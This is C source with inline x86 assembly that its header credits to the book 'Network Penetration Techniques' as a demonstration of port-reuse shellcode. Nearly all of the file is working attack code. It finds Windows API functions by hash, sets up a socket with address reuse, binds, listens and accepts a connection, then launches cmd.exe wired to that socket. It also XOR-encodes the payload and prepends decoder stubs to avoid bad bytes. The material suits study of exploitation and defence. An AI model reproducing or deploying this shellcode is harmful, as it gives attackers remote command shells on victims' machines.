/* shellcode_port_reuse.c
*
*  《网络渗透技术》演示程序
*  作者：san, alert7, eyas, watercloud
*
*  端口复用的shellcode演示
*/

#define PROC_BEGIN __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90\
                   __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90
#define PROC_END PROC_BEGIN

unsigned char sh_Buff[1024];
unsigned int  sh_Len;
unsigned int  Enc_key=0x99;

unsigned char decode1[] =
/*
00401004   . /EB 0E         JMP SHORT encode.00401014
00401006   $ |5B            POP EBX
00401007   . |4B            DEC EBX
00401008   . |33C9          XOR ECX,ECX
0040100A   . |B1 FF         MOV CL,0FF
0040100C   > |80340B 99     XOR BYTE PTR DS:[EBX+ECX],99
00401010   .^|E2 FA         LOOPD SHORT encode.0040100C
00401012   . |EB 05         JMP SHORT encode.00401019
00401014   > \E8 EDFFFFFF   CALL encode.00401006
*/
"\xEB\x0E\x5B\x4B\x33\xC9\xB1"
"\xFF"          // shellcode size
"\x80\x34\x0B"
"\x99"          // xor byte
"\xE2\xFA\xEB\x05\xE8\xED\xFF\xFF\xFF";

unsigned 
char decode2[] =
/* ripped from eyas
00406030   /EB 10           JMP SHORT 00406042
00406032   |5B              POP EBX
00406033   |4B              DEC EBX
00406034   |33C9            XOR ECX,ECX
00406036   |66:B9 6601      MOV CX,166
0040603A   |80340B 99       XOR BYTE PTR DS:[EBX+ECX],99
0040603E  ^|E2 FA           LOOPD SHORT 0040603A
00406040   |EB 05           JMP SHORT 00406047
00406042   \E8 EBFFFFFF     CALL 00406032
*/
"\xEB\x10\x5B\x4B\x33\xC9\x66\xB9"
"\x66\x01"      // shellcode size
"\x80\x34\x0B"
"\x99"          // xor byte
"\xE2\xFA\xEB\x05\xE8\xEB\xFF\xFF\xFF";

// kernel32.dll functions index
#define _LoadLibraryA           0x00
#define _CreateProcessA         0x04
#define _TerminateProcess       0x08
// ws2_32.dll functions index
#define _WSAStartup             0x0C
#define _WSASocketA             0x10
#define _setsockopt             0x14
#define _bind                   0x18
#define _listen                 0x1C
#define _accept                 0x20
// data index
#define _ip                     0x24
#define _port                   0x28

// functions number
#define _Knums                  3
#define _Wnums                  6

// Need functions
unsigned char functions[100][128] =
{
    // kernel32
    {"LoadLibraryA"},       // [esi]
    {"CreateProcessA"},     // [esi+0x04]
    {"TerminateProcess"},   // [esi+0x08]
    // ws2_32
    {"WSAStartup"},         // [esi+0x0C]
    {"WSASocketA"},         // [esi+0x10]
    {"setsockopt"},         // [esi+0x14]
    {"bind"},               // [esi+0x18]
    {"listen"},             // [esi+0x1C]
    {"accept"},             // [esi+0x20]
    {"ip"},                 // [esi+0x24]
    {"port"},               // [esi+0x28]
    {""},
};

void PrintSc(unsigned char *lpBuff, int buffsize);
void ShellCode();

// Get function hash
unsigned long hash(unsigned char *c)
{
    unsigned long h=0;
    while(*c)
    {
        h = ( ( h << 25 ) | ( h >> 7 ) ) + *c++;
    }
    return h;
}

// get shellcode
void GetShellCode()
{
    char  *fnbgn_str="\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    char  *fnend_str="\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    unsigned char  *pSc_addr;
    unsigned char  pSc_Buff[1024];
    unsigned int   MAX_Sc_Len=0x2000;
    unsigned long  dwHash[100];
    unsigned int   dwHashSize;

    int l,i,j,k;

    // Get functions hash
    for (i=0;;i++) {
        if (functions[i][0] == '\x0') break;

        dwHash[i] = hash(functions[i]);
        //fprintf(stderr, "%.8X\t%s\n", dwHash[i], functions[i]);
    }
    dwHashSize = i*4;

    // Deal with shellcode
    pSc_addr = (unsigned char *)ShellCode;

    for (k=0;k<MAX_Sc_Len;++k ) {
        if(memcmp(pSc_addr+k,fnbgn_str, 8)==0) {
            break;
        }
    }
    pSc_addr+=(k+8);   // start of the ShellCode
    
    for (k=0;k<MAX_Sc_Len;++k) {
        if(memcmp(pSc_addr+k,fnend_str, 8)==0) {
            break;
        }
    }
    sh_Len=k; // length of the ShellCode
    
    memcpy(pSc_Buff, pSc_addr, sh_Len);

    // Add functions hash
    memcpy(pSc_Buff+sh_Len, (unsigned char *)dwHash, dwHashSize);
    sh_Len += dwHashSize;

    //printf("%d bytes shellcode\n", sh_Len);
    // print shellcode
    //PrintSc(pSc_Buff, sh_Len);

    // find xor byte
    for(i=0xff; i>0; i--)
    {
        l = 0;
        for(j=0; j<sh_Len; j++)
        {
            if ( 
//                   ((pSc_Buff[j] ^ i) == 0x26) ||    //%
//                   ((pSc_Buff[j] ^ i) == 0x3d) ||    //=
//                   ((pSc_Buff[j] ^ i) == 0x3f) ||    //?
//                   ((pSc_Buff[j] ^ i) == 0x40) ||    //@
                   ((pSc_Buff[j] ^ i) == 0x00) ||
//                   ((pSc_Buff[j] ^ i) == 0x0D) ||
//                   ((pSc_Buff[j] ^ i) == 0x0A) ||
                   ((pSc_Buff[j] ^ i) == 0x5C)
                )
            {
                l++;
                break;
            };
        }

        if (l==0)
        {
            Enc_key = i;
            //printf("Find XOR Byte: 0x%02X\n", i);
            for(j=0; j<sh_Len; j++)
            {
                pSc_Buff[j] ^= Enc_key;
            }

            break;                        // break when found xor byte
        }
    }

    // No xor byte found
    if (l!=0){
        //fprintf(stderr, "No xor byte found!\n");

        sh_Len  = 0;
    }
    else {
        //fprintf(stderr, "Xor byte 0x%02X\n", Enc_key);

        // encode
        if (sh_Len > 0xFF) {
            *(unsigned short *)&decode2[8] = sh_Len;
            *(unsigned char *)&decode2[13] = Enc_key;

            memcpy(sh_Buff, decode2, sizeof(decode2)-1);
            memcpy(sh_Buff+sizeof(decode2)-1, pSc_Buff, sh_Len);
            sh_Len += sizeof(decode2)-1;
        }
        else {
            *(unsigned char *)&decode1[7]  = sh_Len;
            *(unsigned char *)&decode1[11] = Enc_key;

            memcpy(sh_Buff, decode1, sizeof(decode1)-1);
            memcpy(sh_Buff+sizeof(decode1)-1, pSc_Buff, sh_Len);
            sh_Len += sizeof(decode1)-1;
        }
    }
}

// print shellcode
void PrintSc(unsigned char *lpBuff, int buffsize)
{
    int i,j;
    char *p;
    char msg[4];
    fprintf(stderr, "/* %d bytes */\n",buffsize);
    for(i=0;i<buffsize;i++)
    {
        if((i%16)==0)
            if(i!=0)
                fprintf(stderr, "\"\n\"");
            else
                fprintf(stderr, "\"");
        sprintf(msg,"\\x%.2X",lpBuff[i]&0xff);
        for( p = msg, j=0; j < 4; p++, j++ )
        {
            if(isupper(*p))
                fprintf(stderr, "%c", _tolower(*p));
            else
                fprintf(stderr, "%c", p[0]);
        }
    }
    fprintf(stderr, "\";\n");
}

// shellcode function
void ShellCode()
{
       __asm{

PROC_BEGIN    //C macro to begin proc

        jmp     locate_addr
func_start:
        pop     edi                             ; get eip
        mov     eax, fs:30h
        mov     eax, [eax+0Ch]
        mov     esi, [eax+1Ch]
        lodsd
        mov     ebp, [eax+8]                    ; base address of kernel32.dll

        mov     esi, edi

        push    _Knums
        pop     ecx

        GetKFuncAddr:                           ; find functions from kernel32.dll
        call    find_hashfunc_addr
        loop    GetKFuncAddr

        push    3233h
        push    5F327377h                       ; ws2_32
        push    esp
        call    dword ptr [esi+_LoadLibraryA]
        mov     ebp, eax                        ; base address of ws2_32.dll
        push    _Wnums
        pop     ecx
        
        GetWFuncAddr:                           ; find functions from ws2_32.dll
        call    find_hashfunc_addr
        loop    GetWFuncAddr
        
        add     edi, 8                          ; skip ip and port variable

        sub     esp, 190h
        push    esp
        push    101h
        call    dword ptr [esi+_WSAStartup]     ; WSAStartup(0x101, &WSADATA[0x190 bytes!])

        push    eax
        push    eax
        push    eax
        push    eax
        push    1
        push    2
        call    dword ptr [esi+_WSASocketA]     ; WSASocketA(2,1,0,0,0,0)

        mov     ebx, eax                        ; socket handle
        mov     dword ptr [edi], 1
        push    4
        lea     edx, [edi]
        push    edx
        push    4
        push    0xFFFF
        push    ebx
        call    dword ptr [esi+_setsockopt]

        mov     word ptr [edi], 0x0002
        mov     ax, word ptr [esi+_port]
        xchg    al, ah
        mov     word ptr [edi+2], ax            ; listen port
        mov     eax, dword ptr [esi+_ip]
        mov     dword ptr [edi+4], eax          ; IP address
        push    10h
        push    edi
        push    ebx
        call    dword ptr [esi+_bind]

        push    1
        push    ebx
        call    dword ptr [esi+_listen]

        push    eax
        push    eax
        push    ebx
        call    dword ptr [esi+_accept]

        mov     ebx, eax                        ; ebx = socket
        push    646D63h                         ; "cmd"
        lea     edx, [esp]

        sub     esp, 54h
        mov     edi, esp
        push    14h
        pop     ecx
        xor     eax, eax
        stack_zero:
        mov     [edi+ecx*4], eax
        loop    stack_zero

        mov     byte ptr [edi+10h], 44h         ; si.cb = sizeof(si)
        inc     byte ptr [edi+3Ch]              ; si.dwFlags = 0x100
        inc     byte ptr [edi+3Dh]              ; dwFlags
        mov     [edi+48h], ebx                  ; si.hStdInput = socket
        mov     [edi+4Ch], ebx                  ; hStdOutput = socket
        mov     [edi+50h], ebx                  ; hStdError = socket
        lea     eax, [edi+10h]

        push    edi
        push    eax
        push    ecx
        push    ecx
        push    ecx
        push    1
        push    ecx
        push    ecx
        push    edx                             ; "cmd"
        push    ecx
        call    dword ptr [esi+_CreateProcessA]

        xor     eax, eax
        dec     eax
        push    eax
        call    dword ptr [esi+_TerminateProcess]

find_hashfunc_addr:
        push    ecx
        push    esi
        mov     esi, [ebp+3Ch]                  ; e_lfanew
        mov     esi, [esi+ebp+78h]              ; ExportDirectory RVA
        add     esi, ebp                        ; rva2va
        push    esi
        mov     esi, [esi+20h]                  ; AddressOfNames RVA
        add     esi, ebp                        ; rva2va
        xor     ecx, ecx
        dec     ecx
        
        find_start:
        inc     ecx
        lodsd
        add     eax, ebp
        xor     ebx, ebx
        
        hash_loop:
        movsx   edx, byte ptr [eax]
        cmp     dl, dh
        jz      short find_addr
        ror     ebx, 7                          ; hash
        add     ebx, edx
        inc     eax
        jmp     short hash_loop
     
        find_addr:
        cmp     ebx, [edi]                      ; compare to hash
        jnz     short find_start
        pop     esi                             ; ExportDirectory
        mov     ebx, [esi+24h]                  ; AddressOfNameOrdinals RVA
        add     ebx, ebp                        ; rva2va
        mov     cx, [ebx+ecx*2]                 ; FunctionOrdinal
        mov     ebx, [esi+1Ch]                  ; AddressOfFunctions RVA
        add     ebx, ebp                        ; rva2va
        mov     eax, [ebx+ecx*4]                ; FunctionAddress RVA
        add     eax, ebp                        ; rva2va
        stosd                                   ; function address save to [edi]
        pop     esi
        pop     ecx
        retn

        locate_addr:
        call    func_start

PROC_END      //C macro to end proc

        }

}
